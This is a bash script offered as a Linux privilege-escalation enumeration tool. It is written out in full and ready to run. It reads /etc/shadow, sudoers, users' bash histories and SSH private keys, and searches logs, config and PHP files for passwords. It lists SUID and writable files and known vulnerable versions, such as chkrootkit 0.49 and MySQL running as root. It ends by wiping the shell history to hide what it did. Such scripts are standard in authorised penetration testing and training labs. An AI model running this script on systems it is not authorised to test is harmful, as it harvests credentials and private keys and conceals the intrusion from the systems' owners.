#!/bin/bash

echo "*****************************************"
echo "* Quick Enumeration Script 4 Linux v.01 *"
echo "* Prepared by: @iamfriedbean            *"
echo "*****************************************"
echo
echo "=========================================="
echo "***Basic OS Info***"
echo "=========================================="
uname -a
lsb_release -a
echo
cat /etc/*-release 2>/dev/null
echo
cat /proc/version 2>/dev/null
echo
echo "=========================================="
echo "***PASSWD Contents***"
echo "=========================================="
cat /etc/passwd 2>/dev/null
echo
echo
echo "=========================================="
echo "***PASSWD with shell***"
echo "=========================================="
cat /etc/passwd | grep -v nologin | grep sh 2>/dev/null
echo
echo "=========================================="
echo "***/etc/shadow contents***"
echo "=========================================="
cat /etc/shadow 2>/dev/null
echo
echo "=========================================="
echo "***SUDO in /etc/group***"
echo "=========================================="
cat /etc/group | grep sudo
echo
echo "=========================================="
echo "***Root accounts in passwd***"
echo "=========================================="
grep -v -E "^#" /etc/passwd 2>/dev/null| awk -F: '$3 == 0 { print $1}' 2>/dev/null
echo
echo "=========================================="
echo "***/etc/sudoers***"
echo "=========================================="
grep -v -e '^$' /etc/sudoers 2>/dev/null |grep -v "#" 2>/dev/null
echo

echo "=========================================="
echo "***Can we SUDO without password? ***"
echo "=========================================="
echo '' | sudo -S -l -k 2>/dev/null
echo
echo "=========================================="
echo "***Possible admin users***"
echo "=========================================="
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done | grep adm 2>/dev/null
echo
echo "=========================================="
echo "***CRON Information***"
echo "=========================================="
ls -la /etc/cron.d
echo "/etc/cron.weekly:"
ls -la /etc/cron.weekly/
echo "/etc/cron.daily:"
ls -la /etc/cron.daily/
echo "/etc/cron.hourly:"
ls -la /etc/cron.hourly/
cat /etc/crontab 
echo
echo "=========================================="
echo "***/etc/fstab entries***"
echo "=========================================="
cat /etc/fstab 
echo
echo "=========================================="
echo "***SUID Files***"
echo "=========================================="
find / -perm -u=s -type f -printf %M" "%u":"%g" "%TD" "%p\\n  2>/dev/null
echo
echo "=========================================="
echo "***SUID Files not with /*bin***"
echo "=========================================="
find / -perm -u=s -type f -printf %M" "%u":"%g" "%TD" "%p\\n  2>/dev/null| grep -v bin 
echo
echo "=========================================="
echo "***SUID in Group Files***"
echo "=========================================="
find / -perm -g=s -type f -printf %M" "%u":"%g" "%TD" "%p\\n  2>/dev/null 
echo
echo "=========================================="
echo "***Writeable Files***"
echo "=========================================="
find / -perm -2 -type f -printf %M" "%u":"%g" "%TD" "%p\\n 2>/dev/null | grep -v '/proc/'
echo
echo "=========================================="
echo "***Look at files in Home directories***"
echo "=========================================="
for a in /home/*; do ls -al  $a/;done 2>/dev/null
echo
echo "=========================================="
echo "***Look at .bash_histories***"
echo "=========================================="
for a in /home/* ; do cat $a/.bash_history;done 2>/dev/null
echo
echo "=========================================="
echo "***Look for SSH Private Keys***"
echo "=========================================="
for a in /home/* ; do cat $a/.ssh/id_rsa;done 2>/dev/null
echo
grep -rl "PRIVATE KEY-----" /home 2>/dev/null
echo
echo "=========================================="
echo "***Check for UDEV Version***"
echo "=========================================="
/bin/udevadm --version 2>/dev/null
echo

echo "=========================================="
echo "***Check for Sudo Version***"
echo "=========================================="
sudo -V 2>/dev/null| grep "Sudo version" 2>/dev/null
echo

echo "=========================================="
echo "***Check for chkrootkit Version***"
echo "=========================================="
chkrootkit -V 2>/dev/null
echo
echo " note: chkrootkit 0.49 is vulnerable to privesc if running in cron"
echo
echo "=========================================="
echo "***Check for LDD/GLIBC Version***"
echo "=========================================="
ldd --version
echo
echo "=========================================="
echo "***Check if MySQL as root for UDF Privesc***"
echo "=========================================="
ps -aux | grep mysql 2>/dev/null
echo
echo "=========================================="
echo "***Looking for password in .htpasswd***"
echo "=========================================="
find / -name .htpasswd -print -exec cat {} \; 2>/dev/null
echo
echo "=========================================="
echo "***Looking for password in Log files***"
echo "=========================================="
find / -maxdepth 5 -name *.log -type f -exec grep -Hn -i pass {} \; 2>/dev/null 
echo
echo "=========================================="
echo "***Looking for password in INI files***"
echo "=========================================="
find / -maxdepth 5 -name *.ini -type f -exec grep -Hn -i pass {} \; 2>/dev/null 
echo
echo "=========================================="
echo "***Looking for password in CONF files***"
echo "=========================================="
find / -maxdepth 5 -name *.conf -type f -exec grep -Hn -i pass {} \; 2>/dev/null 
echo
echo "=========================================="
echo "***Looking for password in Php files***"
echo "=========================================="
find / -maxdepth 5 -name *.php -type f -exec grep -Hn -i pass {} \; 2>/dev/null 
echo
echo "=========================================="
echo "***Looking for Root in Php files***"
echo "=========================================="
find / -maxdepth 5 -name *.php -type f -exec grep -Hn root {} \; 2>/dev/null 
echo
echo "=========================================="
echo "***Looking for Mails***"
echo "=========================================="
ls -la /var/mail 2>/dev/null
echo
echo "=========================================="
echo "***Available Shells***"
echo "=========================================="
cat /etc/shells 2>/dev/null
echo
echo "=========================================="
echo "***Available Key Tools***"
echo "=========================================="
which nc 2>/dev/null ;which nmap 2>/dev/null ;which python 2>/dev/null ;which python3 2>/dev/null ; which perl 2>/dev/null ;which ruby 2>/dev/null ;which netcat 2>/dev/null ; which wget 2>/dev/null ; which nmap 2>/dev/null ; which gcc 2>/dev/null;which cc 2>/dev/null; which curl 2>/dev/null
echo
cat /dev/null > ~/.bash_history
history -c
echo "Done!......................................."
echo












